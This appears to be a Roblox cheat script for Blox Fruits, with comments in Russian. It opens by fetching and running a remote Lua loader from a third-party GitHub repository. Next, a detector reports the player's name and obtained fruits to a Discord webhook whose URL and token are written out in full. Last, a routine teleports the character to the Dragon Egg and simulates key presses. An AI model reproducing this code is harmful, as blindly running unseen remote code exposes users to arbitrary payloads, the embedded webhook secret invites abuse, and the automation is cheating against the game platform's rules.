loadstring(game:HttpGet("https://raw.githubusercontent.com/Omgshit/Scripts/main/MainLoader.lua"))()
-- Детектор фруктов (отправка в Discord)
local player = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local webhook = "https://discord.com/api/webhooks/1469730327617601880/E_2KCQuiMpbsp24Q27J9n2PKhj-a4nexepAs1rAfeYrnDgw2QHO5t1FBjTzuZqPF-Wgh"  -- замените

local sent = {}

local function sendToDiscord(itemName)
    local msg = {
        content = player.Name .. " получил '" .. itemName .. "'!",
        username = "Инвентарь"
    }
    local json = HttpService:JSONEncode(msg)
    pcall(function()
        HttpService:RequestAsync({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = json
        })
    end)
    print("[DISCORD] Отправлено:", itemName)
end

local function checkItem(item)
    if item:IsA("Tool") and item.Name:find("Fruit") then
        if sent[item.Name] then return end
        sent[item.Name] = true
        sendToDiscord(item.Name)
    end
end

local function track()
    local char = player.Character or player.CharacterAdded:Wait()
    local backpack = player:WaitForChild("Backpack")
    backpack.ChildAdded:Connect(function(it) task.wait(0.1); checkItem(it) end)
    char.ChildAdded:Connect(function(it) if it:IsA("Tool") then task.wait(0.1); checkItem(it) end end)
    for _, it in ipairs(backpack:GetChildren()) do if it:IsA("Tool") and it.Name:find("Fruit") then sent[it.Name] = true end end
    for _, it in ipairs(char:GetChildren()) do if it:IsA("Tool") and it.Name:find("Fruit") then sent[it.Name] = true end end
    print("Детектор фруктов запущен")
end

track()

-- Простой скрипт: при появлении Dragon Egg переместиться к точке и нажать E
local player = game.Players.LocalPlayer
local vim = game:GetService("VirtualInputManager")
local activated = false

-- Смещение относительно острова
local EGG_OFFSET = Vector3.new(227.3, -686.0, -592.7)

local function findIsland()
    local map = workspace:FindFirstChild("Map")
    return map and map:FindFirstChild("PrehistoricIsland")
end

local function moveTo(targetPos, speed)
    local char = player.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChild("Humanoid")
    if not hrp or not hum then return end
    local oldPlatform = hum.PlatformStand
    hum.PlatformStand = true
    local step = 0.05
    local stepSize = speed * step
    while (hrp.Position - targetPos).Magnitude > 1.0 do
        local dir = (targetPos - hrp.Position).Unit
        local move = math.min(stepSize, (targetPos - hrp.Position).Magnitude)
        local newPos = hrp.Position + dir * move
        hrp.CFrame = CFrame.new(newPos)
        task.wait(step)
    end
    hrp.CFrame = CFrame.new(targetPos)
    hum.PlatformStand = oldPlatform
end

local function pressE()
    if vim then
        vim:SendKeyEvent(true, "E", false, game)
        task.wait(1.5)
        vim:SendKeyEvent(false, "E", false, game)
        print("[ЯЙЦО] Активация")
    end
end

task.spawn(function()
    while not activated do
        local island = findIsland()
        if island then
            local targetPos = island:GetPivot().Position + EGG_OFFSET
            print("[ЯЙЦО] Перемещение к точке", targetPos)
            moveTo(targetPos, 200)
            pressE()
            activated = true
        end
        task.wait(1)
    end
end)
